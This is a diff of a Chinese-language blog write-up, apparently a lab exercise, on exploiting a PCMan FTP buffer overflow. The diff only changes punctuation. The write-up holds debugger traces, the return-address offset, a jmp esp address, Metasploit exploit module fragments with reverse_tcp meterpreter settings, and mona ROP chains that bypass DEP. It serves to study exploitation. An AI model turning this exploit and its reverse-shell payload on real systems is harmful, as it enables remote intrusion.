@@ -450,7 +450,7 @@ on 192.168.3.177's od:
 <p>图od1
 <img src="https://raw.githubusercontent.com/xinghuacai/pic/master/od1.png" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下：
+<div class="highlighter-rouge"><pre class="highlight"><code>于是重新在405410,416685,427350处下断点,重点关注405410到416685后,在416685开始的指令流程,具体如下:
 
 on 192.168.3.177'od:
     ctrl+g:405410---&gt;f2
@@ -482,7 +482,7 @@ on 192.168.3.177's od:
     f9
     此时自动中断在416685处
 
-    -----------output：-----------
+    -----------output:-----------
     00416685  |.  FF15 58524300 call dword ptr ds:[&lt;&amp;KERNEL32.GetLastErr&gt;; [GetLastError
     0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
     00416691  |.  8BF8          mov edi,eax                              ; |
@@ -492,7 +492,7 @@ on 192.168.3.177's od:
     f9
     此时又中断到416685处(不过堆栈窗口出现了AAAAAAA)
 
-    ------------output：-----------
+    ------------output:-----------
     00416685  |.  FF15 58524300 call dword ptr ds:[&lt;&amp;KERNEL32.GetLastErr&gt;; [GetLastError
     0041668B  |.  FF35 B0284400 push dword ptr ds:[0x4428B0]             ; /TlsIndex = 1A
     00416691  |.  8BF8          mov edi,eax                              ; |
@@ -510,7 +510,7 @@ on 192.168.3.177's od:
 esp下面的第二个返回到的地址4029db为当前函数栈帧的上一函数栈帧中的retn要返回的地址
 esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函数的上一函数的栈帧中的retn要返回的地址
 
-此时堆栈窗口数据如下：
+此时堆栈窗口数据如下:
     ----------------stack------------------
     0018ED28   00000402
     0018ED2C   004411DC  ASCII "
@@ -542,11 +542,11 @@ esp下面的第三个返回到的地址4029ff为当前函数栈帧的上一函�
     0018ED8C   41414141
     -----------------end-------------------
 
-参照上一篇文章：
-http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知：
+参照上一篇文章:
+http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%85%A5%E9%97%A8-%E5%8A%A8%E6%80%81%E8%B7%9F%E8%B8%AA%E6%BA%90%E4%BB%A3%E7%A0%81%E5%92%8C%E5%8F%8D%E6%B1%87%E7%BC%96%E4%BB%A3%E7%A0%81/中的图stack0易知:
     
     其中栈中0018ed8c以后很长一段数据都是41414141,由于此时中断到416685而堆栈窗口中首次出现AAAAAA数据,而堆栈窗口中最近的三个返回地址中00412976对应的是本函数栈帧(对应图od2)中的004166e9处的retn,这样的话,很有可能是本函数栈帧的上一帧函数(该函数内的retn对应返回到4029db)或者是上上一帧函数(该函数内的retn对应返回到4029ef)的返回地址被此时栈中的大长串A覆盖成41414141
-    当前eip对应的函数帧是00416683函数,当前函数帧的上一帧函数是wsock32.recv,wsock32.recv函数帧的上一函数帧的00412956函数,形如下面表示：
+    当前eip对应的函数帧是00416683函数,当前函数帧的上一帧函数是wsock32.recv,wsock32.recv函数帧的上一函数帧的00412956函数,形如下面表示:
     -----------------------------format:--------------------------------
     00412956:(412956函数帧)
             00412954:push ebp
@@ -591,7 +591,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
 
     于是重点关注堆栈窗口中的0018ed5c处的004029db和0018ed64处的004029ef是否可能会在当前函数帧中执行到004166e9之前或下一个将到达的函数帧中被改写成41414141
 
-    在od中f8单步调试时,遇到可疑指令如call xxx等,在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64,然后f8单步调试,具体如下操作：
+    在od中f8单步调试时,遇到可疑指令如call xxx等,在堆栈窗口中ctrl+g(堆栈中跟随):0018ed5c或0018ed64,然后f8单步调试,具体如下操作:
 
     ------------从图od2中情况下开始的操作-------------
     f8
@@ -602,14 +602,14 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
     f8
     ..
     f8
-    执行到412997处时,在到达这个函数帧中的rent语句前,所有的指令都在wsock32.recv函数帧中,0018ed5c中的返回地址由004029db被改成000000,也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏,执行完wsock32.recv函数帧中的retn指令后,将跳到00000000执行,也即在当前帧(wsock32.recv函数帧)中执行到retn语句时,将发生错误,对应汇编指令为：
+    执行到412997处时,在到达这个函数帧中的rent语句前,所有的指令都在wsock32.recv函数帧中,0018ed5c中的返回地址由004029db被改成000000,也即wsock32.recv函数帧中的retn指令被执行时将返回到由004029db变成的00000000,此时栈帧已经被破坏,执行完wsock32.recv函数帧中的retn指令后,将跳到00000000执行,也即在当前帧(wsock32.recv函数帧)中执行到retn语句时,将发生错误,对应汇编指令为:
 
         00412976    5F              pop edi
         00412977    8A16            mov dl,byte ptr ds:[esi]
         00412979    B3 01           mov bl,0x1
         0041297B    0FB6CA          movzx ecx,dl
 
-    对应堆栈窗口中0018ed5c和0018ed64处的内容为：
+    对应堆栈窗口中0018ed5c和0018ed64处的内容为:
 
         0018ED58   00000000
         0018ED5C   00000000
@@ -618,7 +618,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
         0018ED68   0018ED78  ASCII "LIST AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...
         0018ED6C   01D80F80
 
-    而当前函数帧中的retn语句在如下位置004129f9处：
+    而当前函数帧中的retn语句在如下位置004129f9处:
 
         004129F1    F7D8            neg eax
         004129F3    1BC0            sbb eax,eax
@@ -637,7 +637,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
     f8
     f8
     ..
-    f8执行到004129df,以jmp 到004129c1,也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下：
+    f8执行到004129df,以jmp 到004129c1,也即004129c1到004129df相当于一个for循环,004129c1处开始到retn语句前的汇编指令如下:
 
         004129C1    8A02            mov al,byte ptr ds:[edx]
         004129C3    84C0            test al,al
@@ -688,7 +688,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
     
     发送Ax1998+Bx4+Cx4+Dx4+F+Ex6989(共9000个字节),成功使之停止工作,且异常偏移显示为46444444,说明发送的9000个字节中,第2008到2011个字节处为覆盖eip处,构造exploit,发现与https://www.exploit-db.com/exploits/39662/链接中的偏移情况相同,都是在第2008-2011个字节处为覆盖返回地址的eip处,在这里填入jmp esp的地址后,再在后面填入用于反弹的shellcode即可,不同的是exploit-db中的是winxpsp3 eng环境,而此处环境为win7x64的中文系统环境
     
-    在192.168.3.177中运行pcmanftp后od附加,alt+e选择一个系统dll(实验中选择的是c:\windows\system32\ntdll.dll),在od中ctrl+f：jmp esp找到一个地址为77506aeb,构造的exploit如下：
+    在192.168.3.177中运行pcmanftp后od附加,alt+e选择一个系统dll(实验中选择的是c:\windows\system32\ntdll.dll),在od中ctrl+f:jmp esp找到一个地址为77506aeb,构造的exploit如下:
 
     -------------------------exploit.rb---------------------------------
     ##
@@ -779,12 +779,12 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
     end
     ---------------------------end--------------------------------------
 
-exploit情况说明：
+exploit情况说明:
     1.在实际msf中加载上面的exploit时,发现要应该对应第2009个字节开始为填充的jmp esp的地址,也即exploit代码中的填充随机覆盖的数据要有2008个,而不是原来认为的2007个
     2.出现1中的情况认为可能是考虑覆盖偏移量时不应该从AAAA开始,要从ls命令开始,也即ls AAAA开始算
     3.上面代码中没有发送共9000个字节的数据,用反弹的shellcode代替也可成功
     4.win7系统重启后,jmp esp地址会改变,重启后代码中的jmp esp的地址不再合适
-    5.将上面的代码重命名为mypcmanftp.rb,放到kali中/usr/share/metasploit-framework/moudles/exploits/windows/my/目录下,使用如下命令：
+    5.将上面的代码重命名为mypcmanftp.rb,放到kali中/usr/share/metasploit-framework/moudles/exploits/windows/my/目录下,使用如下命令:
             use exploit/windows/my/mypcmanftp
             set payload windows/meterpreter/reverse_tcp
             set rhost 192.168.3.177
@@ -857,9 +857,9 @@ def create_rop_chain()
 
 mona中给出rop_gadgets只是参考的rop,并不代表一定可用,且最新v2版本似乎有点错误,mona算出的rop_gadgets中的第一个地址0x027c9a7a在od中ctrl+g查看一下发现不是对应pop ecx,retn的地址,且有一些地址是执行会产生问题的,这时需要结合od在实际情况中调试
 
-实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX,EBX+retn在od中ctrl+g：7727060d确实是对应xchg eax,ebx+retn指令的,但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断,并f7,再f8,f8,...)中00402a26处的call 403e60后(402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b,在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址)发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写,比较奇怪,认为是这个地址出了问题,从rop_suggestions.txt中找另外的XCHG EAX,EBX+RETN对应的地址代替后不会有这个问题
+实际调试中发现上面的第10个地址0x7727060d对应的XCHG EAX,EBX+retn在od中ctrl+g:7727060d确实是对应xchg eax,ebx+retn指令的,但是如果第10个地址用7727060d,在od跟踪pcmanftp(在402a26处下断,并f7,再f8,f8,...)中00402a26处的call 403e60后(402a26处的call 403e60汇编语句的下一句汇编语句的地址为402a2b,在上面dep off的实验中是堆栈窗口中的18ed64处的402a2b被改成jmp esp的地址)发现堆栈窗口中从18ed64处开始的对应的第10个地址会被改写,比较奇怪,认为是这个地址出了问题,从rop_suggestions.txt中找另外的XCHG EAX,EBX+RETN对应的地址代替后不会有这个问题
 
-pcmanftp中的关键断点：
+pcmanftp中的关键断点:
     00402a26处的call 403e60
         403e60函数帧里面的403ee6处的call 00412cbf
             412cbf函数帧里面的412ce8处的call 00416c5c
@@ -898,7 +898,7 @@ pcmanftp中的关键断点：
       end
 -----------------------end--------------------------
 
-其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中：
+其中向192.168.3.177中pcmanftp发送的数据在下面的sploit变量中:
 
 -----------------------sploit---------------------
      sploit = rand_text_alpha(target['Offset'])
@@ -937,7 +937,7 @@ resume all threads后,pcmanftp中断在00402a26,f9再运行到00402a26,此时开
     00402A56    81C4 04100000   add esp,0x1004
     00402A5C    C2 0400         retn 0x4
 
-此时堆栈中18ed64处的返回地址还没有被覆盖,如下所示：
+此时堆栈中18ed64处的返回地址还没有被覆盖,如下所示:
 
     0018ED5C   00000000
     0018ED60   00000000
@@ -947,7 +947,7 @@ resume all threads后,pcmanftp中断在00402a26,f9再运行到00402a26,此时开
     0018ED70   00000000
 
 其中0018ed5c处的返回地址已经被覆盖成00000000,18ed68处的的指针对应的是msf中的sploit变量的数据
-od中f7进入403e60函数帧：
+od中f7进入403e60函数帧:
 
     00403E60    A1 40354400     mov eax,dword ptr ds:[0x443540]
     00403E65    81EC 14080000   sub esp,0x814
@@ -1039,7 +1039,7 @@ od中f7进入403e60函数帧：
     00403F6B    C2 0400         retn 0x4
 
 一直f8到上面403ee6处的call 00412cbf,暂时不跟进,再按f8之后将完成18ed64处的返回地址被覆盖
-f8后18ed64处的覆盖内容如下：
+f8后18ed64处的覆盖内容如下:
     
     0018ED5C   564F514E  #此时此处的原来被覆盖成00000000的wsock.revc函数的返回地址被覆盖成另外的值
     0018ED60   6475586A
@@ -1081,7 +1081,7 @@ f8跟踪到0018edb4处的772b73df,772b73df中的指令为pushad retn,可想,执�
 
 觉得是mona的错误,不应该在最后加个poshad+retn的地址,将rop_gadgets中最后的pushad+retn的地址删除后再重新发送sploit数据并跟踪到rop_gadgets中第一个数据,然后再f8..f8看看哪里会出问题
 
-再次进入到rop_gadgets中的第一个地址778a45e1处,此时eip=778a45e1,堆栈窗口中的18ed64处的数据为：
+再次进入到rop_gadgets中的第一个地址778a45e1处,此时eip=778a45e1,堆栈窗口中的18ed64处的数据为:
 
     0018ED64   778A45E1  ntdll_12.778A45E1
     0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
@@ -1112,7 +1112,7 @@ f8跟踪到0018edb4处的772b73df,772b73df中的指令为pushad retn,可想,执�
     0018EDCC   98379648
     0018EDD0   90CC2797
 
-对比观察发现rop_gadgets中的地址还没开始执行(eip=778a45e1)时,后面的rop_gadgets数据不变,但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时,堆栈窗口中的数据如下：
+对比观察发现rop_gadgets中的地址还没开始执行(eip=778a45e1)时,后面的rop_gadgets数据不变,但是后面30个nop还是被改成其他数据,尝试将后面的30个nop改成41414141...再次跟踪到eip=rop_gadgets中的第一个地址778a45e1时,堆栈窗口中的数据如下:
 
     0018ED64   778A45E1  ntdll_12.778A45E1
     0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
@@ -1149,7 +1149,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
 
 提到msf的payload前面有可能需要至少9个nop空间帮助完成payload的解码等工作,将30个nop改成9个nop试试9个nop会不会被改成随机的填充数据
 
-再次重新跟踪到eip=rop_gadgets中的第一个地址时,18ed64处的数据为：
+再次重新跟踪到eip=rop_gadgets中的第一个地址时,18ed64处的数据为:
 
     0018ED64   778A45E1  ntdll_12.778A45E1
     0018ED68   73C112D0  &lt;&amp;KERNEL32.VirtualProtect&gt;
@@ -1177,7 +1177,7 @@ http://xinghuacai.github.io/%E4%BA%8C%E8%BF%9B%E5%88%B6/2016/06/04/%E4%BA%8C%E8%
 
 发现9个nop还是会被填充成随机数据(后来发现不是被win7x64系统的安全保护填充的,而是因为msf自带的nop有好几种,不只是9090,其他应该是类似的花指令),\xcc到是一直没有被改写,试着不要9个nop了,将原来rop_gadges中的pushad+retn指令的地址改成一条jmp esp指令的地址,并在该地址后接payload数据,上面的dep off时的exploit.rb中的jmp esp的地址76061b1b在dep on时为call esp汇编语句的地址,不用在od中查找其他的了,call esp也可跳到后面的pyaload执行
 
-发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp：
+发送如下的rop_gadgets数据+不要nop+不要\xcc的数据到pcmanftp:
 
 ---------------sploit data-------------
 def create_rop_chain()
@@ -1275,7 +1275,7 @@ def create_rop_chain()
 5.利用.NET挑战dep
 6.利用Java applet挑战dep
 这里用的是2中的virtualprotect中的方法,mona生成的virtualalloc的方法应该是缺少了memcopy的chain,导致刚开始一直错误地以为mona错了
-最后再用mona生成的rop_gadgets如下：(第二个地址为新添加的0x41414141)
+最后再用mona生成的rop_gadgets如下:(第二个地址为新添加的0x41414141)
 --------------------new_rop_gadgets--------------------
     rop_gadgets = 
     [
